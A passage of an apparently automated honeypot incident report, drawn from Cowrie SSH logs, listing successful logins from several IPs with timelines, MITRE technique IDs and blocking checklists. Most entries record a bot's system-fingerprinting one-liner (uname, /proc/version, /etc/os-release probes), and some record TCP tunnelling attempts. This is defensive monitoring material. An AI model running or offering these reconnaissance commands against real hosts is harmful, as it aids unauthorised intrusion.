| `2026-08-02 03:04:24` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa9556c0be7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:04 |
| **Last Seen** | 2026-08-02 03:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:04:59` | `cowrie.session.connect` |
| `2026-08-02 03:04:59` | `cowrie.client.version` |
| `2026-08-02 03:04:59` | `cowrie.client.kex` |
| `2026-08-02 03:05:02` | `cowrie.login.success` |
| `2026-08-02 03:05:04` | `cowrie.session.params` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.success` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.command.input` |
| `2026-08-02 03:05:04` | `cowrie.log.closed` |
| `2026-08-02 03:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc082dea68e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:06 |
| **Last Seen** | 2026-08-02 03:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:06:05` | `cowrie.session.connect` |
| `2026-08-02 03:06:05` | `cowrie.client.version` |
| `2026-08-02 03:06:05` | `cowrie.client.kex` |
| `2026-08-02 03:06:07` | `cowrie.login.success` |
| `2026-08-02 03:06:09` | `cowrie.session.params` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.success` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:09` | `cowrie.command.input` |
| `2026-08-02 03:06:10` | `cowrie.log.closed` |
| `2026-08-02 03:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d82255b7da76

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:07 |
| **Last Seen** | 2026-08-02 03:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:07:14` | `cowrie.session.connect` |
| `2026-08-02 03:07:15` | `cowrie.client.version` |
| `2026-08-02 03:07:15` | `cowrie.client.kex` |
| `2026-08-02 03:07:16` | `cowrie.login.success` |
| `2026-08-02 03:07:18` | `cowrie.session.params` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.success` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.command.input` |
| `2026-08-02 03:07:18` | `cowrie.log.closed` |
| `2026-08-02 03:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e08ffe9b46

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:08 |
| **Last Seen** | 2026-08-02 03:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:08:23` | `cowrie.session.connect` |
| `2026-08-02 03:08:24` | `cowrie.client.version` |
| `2026-08-02 03:08:24` | `cowrie.client.kex` |
| `2026-08-02 03:08:25` | `cowrie.login.success` |
| `2026-08-02 03:08:26` | `cowrie.session.params` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.success` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.command.input` |
| `2026-08-02 03:08:26` | `cowrie.log.closed` |
| `2026-08-02 03:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d313bb761373

| Field | Detail |
|---|---|
| **Source IP** | `122.176.45[.]238` |
| **First Seen** | 2026-08-02 03:08 |
| **Last Seen** | 2026-08-02 03:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:08:44` | `cowrie.session.connect` |
| `2026-08-02 03:08:44` | `cowrie.client.version` |
| `2026-08-02 03:08:44` | `cowrie.client.kex` |
| `2026-08-02 03:08:46` | `cowrie.login.success` |
| `2026-08-02 03:08:47` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.45[.]238` to AbuseIPDB if not already reported
- [ ] Block `122.176.45[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e5db6891056

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:09 |
| **Last Seen** | 2026-08-02 03:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:09:33` | `cowrie.session.connect` |
| `2026-08-02 03:09:34` | `cowrie.client.version` |
| `2026-08-02 03:09:34` | `cowrie.client.kex` |
| `2026-08-02 03:09:35` | `cowrie.login.success` |
| `2026-08-02 03:09:37` | `cowrie.session.params` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.success` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.command.input` |
| `2026-08-02 03:09:37` | `cowrie.log.closed` |
| `2026-08-02 03:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfa0a840500c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:10 |
| **Last Seen** | 2026-08-02 03:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:10:40` | `cowrie.session.connect` |
| `2026-08-02 03:10:41` | `cowrie.client.version` |
| `2026-08-02 03:10:41` | `cowrie.client.kex` |
| `2026-08-02 03:10:42` | `cowrie.login.success` |
| `2026-08-02 03:10:43` | `cowrie.session.params` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:43` | `cowrie.command.success` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:43` | `cowrie.command.input` |
| `2026-08-02 03:10:44` | `cowrie.command.input` |
| `2026-08-02 03:10:44` | `cowrie.command.input` |
| `2026-08-02 03:10:44` | `cowrie.log.closed` |
| `2026-08-02 03:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92f29bc4415

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:11 |
| **Last Seen** | 2026-08-02 03:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:11:49` | `cowrie.session.connect` |
| `2026-08-02 03:11:49` | `cowrie.client.version` |
| `2026-08-02 03:11:49` | `cowrie.client.kex` |
| `2026-08-02 03:11:51` | `cowrie.login.success` |
| `2026-08-02 03:11:52` | `cowrie.session.params` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.success` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:52` | `cowrie.command.input` |
| `2026-08-02 03:11:53` | `cowrie.log.closed` |
| `2026-08-02 03:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7099eeb2cf

| Field | Detail |
|---|---|
| **Source IP** | `34.78.156[.]244` |
| **First Seen** | 2026-08-02 03:12 |
| **Last Seen** | 2026-08-02 03:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:12:31` | `cowrie.session.connect` |
| `2026-08-02 03:12:31` | `cowrie.login.success` |
| `2026-08-02 03:12:31` | `cowrie.session.params` |
| `2026-08-02 03:12:31` | `cowrie.command.input` |
| `2026-08-02 03:12:31` | `cowrie.command.input` |
| `2026-08-02 03:12:31` | `cowrie.command.failed` |
| `2026-08-02 03:12:31` | `cowrie.command.input` |
| `2026-08-02 03:12:31` | `cowrie.log.closed` |
| `2026-08-02 03:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.156[.]244` to AbuseIPDB if not already reported
- [ ] Block `34.78.156[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-285a2f7ae0b3

| Field | Detail |
|---|---|
| **Source IP** | `34.78.156[.]244` |
| **First Seen** | 2026-08-02 03:12 |
| **Last Seen** | 2026-08-02 03:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:12:44` | `cowrie.session.connect` |
| `2026-08-02 03:12:44` | `cowrie.login.success` |
| `2026-08-02 03:12:45` | `cowrie.session.params` |
| `2026-08-02 03:12:45` | `cowrie.command.input` |
| `2026-08-02 03:12:45` | `cowrie.command.failed` |
| `2026-08-02 03:12:48` | `cowrie.log.closed` |
| `2026-08-02 03:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.156[.]244` to AbuseIPDB if not already reported
- [ ] Block `34.78.156[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b827bdd0b07

| Field | Detail |
|---|---|
| **Source IP** | `34.78.156[.]244` |
| **First Seen** | 2026-08-02 03:12 |
| **Last Seen** | 2026-08-02 03:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:12:46` | `cowrie.session.connect` |
| `2026-08-02 03:12:46` | `cowrie.login.success` |
| `2026-08-02 03:12:47` | `cowrie.session.params` |
| `2026-08-02 03:12:47` | `cowrie.command.input` |
| `2026-08-02 03:12:48` | `cowrie.log.closed` |
| `2026-08-02 03:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.156[.]244` to AbuseIPDB if not already reported
- [ ] Block `34.78.156[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7957ea54ec9f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:12 |
| **Last Seen** | 2026-08-02 03:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:12:54` | `cowrie.session.connect` |
| `2026-08-02 03:12:54` | `cowrie.client.version` |
| `2026-08-02 03:12:54` | `cowrie.client.kex` |
| `2026-08-02 03:12:56` | `cowrie.login.success` |
| `2026-08-02 03:12:58` | `cowrie.session.params` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.success` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.command.input` |
| `2026-08-02 03:12:58` | `cowrie.log.closed` |
| `2026-08-02 03:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32a22248b7c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:14 |
| **Last Seen** | 2026-08-02 03:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:14:00` | `cowrie.session.connect` |
| `2026-08-02 03:14:00` | `cowrie.client.version` |
| `2026-08-02 03:14:00` | `cowrie.client.kex` |
| `2026-08-02 03:14:02` | `cowrie.login.success` |
| `2026-08-02 03:14:03` | `cowrie.session.params` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.success` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:03` | `cowrie.command.input` |
| `2026-08-02 03:14:04` | `cowrie.log.closed` |
| `2026-08-02 03:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f2e4e59f4e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:14 |
| **Last Seen** | 2026-08-02 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:14:23` | `cowrie.session.connect` |
| `2026-08-02 03:14:23` | `cowrie.client.version` |
| `2026-08-02 03:14:23` | `cowrie.client.kex` |
| `2026-08-02 03:14:23` | `cowrie.login.success` |
| `2026-08-02 03:14:24` | `cowrie.session.params` |
| `2026-08-02 03:14:24` | `cowrie.command.input` |
| `2026-08-02 03:14:24` | `cowrie.log.closed` |
| `2026-08-02 03:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4cb92eb537e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:15 |
| **Last Seen** | 2026-08-02 03:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:15:06` | `cowrie.session.connect` |
| `2026-08-02 03:15:06` | `cowrie.client.version` |
| `2026-08-02 03:15:06` | `cowrie.client.kex` |
